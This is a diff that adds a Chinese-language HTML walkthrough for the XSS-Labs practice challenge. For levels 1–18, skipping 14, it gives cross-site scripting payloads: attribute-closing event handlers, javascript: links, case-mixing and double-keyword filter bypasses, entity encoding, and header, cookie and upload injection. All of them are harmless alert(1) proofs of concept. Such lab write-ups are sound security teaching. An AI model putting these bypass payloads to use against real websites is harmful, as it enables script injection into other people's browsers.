@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS-Labs闯关指南</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f9;
+            color: #333;
+        }
+
+        header {
+            background-color: #2c3e50;
+            color: white;
+            text-align: center;
+            padding: 2em 0;
+        }
+
+        h1 {
+            margin: 0;
+            font-size: 2.5em;
+        }
+
+        nav {
+            background-color: #34495e;
+            color: white;
+        }
+
+        nav ul {
+            list-style-type: none;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+        }
+
+        nav ul li {
+            padding: 1em;
+        }
+
+        nav ul li a {
+            color: white;
+            text-decoration: none;
+        }
+
+        main {
+            max-width: 800px;
+            margin: 2em auto;
+            padding: 0 1em;
+        }
+
+        section {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            margin-bottom: 2em;
+            padding: 2em;
+        }
+
+        h2 {
+            color: #2c3e50;
+            border-bottom: 1px solid #ddd;
+            padding-bottom: 0.5em;
+            margin-bottom: 1em;
+        }
+
+        pre {
+            background-color: #ecf0f1;
+            padding: 1em;
+            border-radius: 4px;
+            overflow-x: auto;
+        }
+
+        code {
+            font-family: 'Courier New', Courier, monospace;
+        }
+
+        footer {
+            background-color: #2c3e50;
+            color: white;
+            text-align: center;
+            padding: 1em 0;
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <h1>XSS-Labs闯关指南</h1>
+    </header>
+    <nav>
+        <ul>
+            <li><a href="index.html">返回学习页面</a></li>
+            <li><a href="#xss-labs">XSS-Labs</a></li>
+        </ul>
+    </nav>
+
+    <main>
+        <section id="xss-labs">
+            <h2>XSS漏洞闯关详解</h2>
+
+            <article>
+                <h3>第一关：无过滤弹窗</h3>
+                <p>直接插入弹窗代码</p>
+                <pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+            </article>
+
+            <article>
+                <h3>第二关：闭合属性注入</h3>
+                <p>利用HTML属性闭合,输出被html实体化,但是源码这里有我们的script输出,我们闭合就可以了</p>
+                <pre><code>
+(1) &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot;
+(2) &quot; onclick=alert(1) &quot;
+                </code></pre>
+            </article>
+
+            <article>
+                <h3>第三关：单引号闭合</h3>
+                <p>使用单引号事件处理</p>
+                <pre><code>' onfocus=alert(1) '</code></pre>
+            </article>
+
+            <article>
+                <h3>第四关：双引号闭合</h3>
+                <p>使用双引号事件处理</p>
+                <pre><code>&quot; onmouseover=alert(1) &quot;</code></pre>
+            </article>
+
+            <article>
+                <h3>第五关：超链接触发</h3>
+                <p>构造可点击的超链接</p>
+                <pre><code>&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;xss&lt;/a&gt;&lt;&quot;</code></pre>
+            </article>
+
+            <article>
+                <h3>第六关：大小写绕过</h3>
+                <p>利用大小写混合绕过过滤</p>
+                <pre><code>&quot;&gt;&lt;ScriPt&gt;alert(1)&lt;/ScriPt&gt;&lt;&quot;</code></pre>
+            </article>
+
+            <article>
+                <h3>第七关：双写绕过</h3>
+                <p>通过双写关键词绕过</p>
+                <pre><code>&quot;&gt;&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;&lt;&quot;</code></pre>
+            </article>
+
+            <article>
+                <h3>第八关：实体化绕过</h3>
+                <p>使用HTML实体编码</p>
+                
+                <pre>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</pre>
+                
+            </article>
+
+            <article>
+                <h3>第九关：注释绕过</h3>
+                <p>结合注释绕过检查</p>
+                <pre>
+                    &amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;/*http://*/
+                </pre>
+            </article>
+
+            <article>
+                <h3>第十关：隐藏域注入</h3>
+                <p>利用隐藏表单字段</p>
+                <pre><code>t_sort=&quot; onclick=alert(1) type=&quot;</code></pre>
+            </article>
+
+            <article>
+                <h3>第十一关：Referer注入</h3>
+                <p>在HTTP头部注入</p>
+                <pre><code>&quot; onmouseover=alert(1) type=&quot;</code></pre>
+            </article>
+
+            <article>
+                <h3>第十二关：User-Agent注入</h3>
+                <p>修改用户代理字符串</p>
+                <pre><code>&quot; onfocus=alert(1) type=&quot;</code></pre>
+            </article>
+
+            <article>
+                <h3>第十三关：Cookie注入</h3>
+                <p>利用Cookie值注入</p>
+                <pre><code>user=&quot; onclick=alert(1) type=&quot;</code></pre>
+            </article>
+
+            <article>
+                <h3>第十五关：文件上传</h3>
+                <p>构造恶意HTML文件</p>
+                <pre><code>src=&quot;1.html&quot;</code></pre>
+                <p>1.html内容：</p>
+                <pre><code>
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;UTF-8&quot;&gt;&lt;/head&gt;
+&lt;body&gt;&lt;input name=&quot;zzf&quot; value=&quot;zzf&quot; onclick=&quot;alert(1)&quot;&gt;&lt;/body&gt;&lt;/html&gt;
+                </code></pre>
+            </article>
+
+            <article>
+                <h3>第十六关：空格实体化绕过</h3>
+                <p>使用换行符编码</p>
+                <pre><code>?keyword=&lt;img%0Asrc=x%0Aonerror=alert(1)&gt;</code></pre>
+            </article>
+
+            <article>
+                <h3>第十七关：Flash事件注入</h3>
+                <p>构造Flash事件属性</p>
+                <pre><code>?arg01=a&arg02= onclick=alert(1)</code></pre>
+            </article>
+
+            <article>
+                <h3>第十八关：参数分隔符注入</h3>
+                <p>利用参数分隔符</p>
+                <pre><code>?arg01=a&arg02=b%20onclick=alert(1)</code></pre>
+            </article>
+        </section>
+    </main>
+
+    <footer>
+        <p>&copy; 2025 网络安全知识分享</p>
+    </footer>
+</body>
+
+</html>
